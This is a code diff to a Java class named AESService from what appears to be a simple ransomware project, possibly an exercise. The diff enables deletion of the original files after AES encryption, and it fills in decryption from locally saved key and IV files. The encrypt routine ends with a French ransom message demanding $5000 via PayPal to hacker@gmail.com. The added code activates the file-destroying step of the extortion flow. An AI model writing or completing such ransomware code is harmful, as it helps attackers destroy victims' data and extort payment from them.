@@ -49,27 +49,27 @@ public class AESService {
                 files.stream().map(File::getPath).collect(Collectors.joining(", "))));
 
         // Convert files to bytes
-        List<FileAsBytes> fileBytes = FileUtils.toBytes(files);
+        List<FileAsBytes> filesAsBytes = FileUtils.toBytes(files);
 
-        SecretKey key = RandomUtils.generateKey();
+        SecretKey key = EncryptionParamsUtils.generateKey();
         Logger.logDebug(String.format("Key : %s", Base64.getEncoder().encodeToString(key.getEncoded())));
-        IvParameterSpec iv = RandomUtils.generateIv();
+        IvParameterSpec iv = EncryptionParamsUtils.generateIv();
         Logger.logDebug(String.format("IV : %s", Base64.getEncoder().encodeToString(iv.getIV())));
 
         // Encrypt file bytes
-        List<FileAsBytes> encryptedBytes = CipherUtils.encrypt(fileBytes, key, iv);
-        List<FileAsStrings> encryptedFiles = ByteUtils.toStrings(encryptedBytes);
+        List<FileAsBytes> encryptedFilesAsBytes = CipherUtils.encrypt(filesAsBytes, key, iv);
+        List<FileAsStrings> encryptedFilesAsStrings = ByteUtils.toStrings(encryptedFilesAsBytes);
 
         // Save filenames and contents to pirate.txt
-        FileUtils.saveStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFiles);
+        FileUtils.saveFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFilesAsStrings);
         Logger.logDebug(String.format("Save encrypted files to %s", ENCRYPTED_FILES_FILENAME));
 
         // Save key and iv to pirate.json
         JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
         Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
-        // TODO : Delete files
-        // FileUtils.deleteFiles(files);
+        // Delete files
+        FileUtils.deleteFiles(files);
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
@@ -82,15 +82,25 @@ public class AESService {
         Logger.logDebug(String.format("Decrypting with directory %s", directory));
 
         // Get encrypted files from pirate.txt
-        List<FileAsStrings> fileAsStrings = FileUtils.getFileAsStrings(directory, ENCRYPTED_FILES_FILENAME);
+        List<FileAsStrings> filesAsStrings = FileUtils.getFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME);
         Logger.logDebug(String.format("Read encrypted files from %s", ENCRYPTED_FILES_FILENAME));
 
         // Get encryption params (key and iv) from pirate.json
         EncryptionParams encryptionParams = JsonUtils.getEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME);
         Logger.logDebug(String.format("Read key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
-        // TODO : Decrypt files
-        // TODO : Save files to given directory
+        // Convert encryption params to their original forms
+        SecretKey key = EncryptionParamsUtils.toSecretKey(encryptionParams.key);
+        IvParameterSpec iv = EncryptionParamsUtils.toIvParameterSpec(encryptionParams.iv);
+
+        // Convert files as strings to files as bytes
+        List<FileAsBytes> filesAsBytes = ByteUtils.toBytes(filesAsStrings);
+
+        // Decrypt files as strings
+        List<FileAsBytes> decryptedFilesAsBytes = CipherUtils.decrypt(filesAsBytes, key, iv);
+
+        // Save files to given directory
+        FileUtils.saveFiles(directory, decryptedFilesAsBytes);
 
         // Display decryption message
         Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
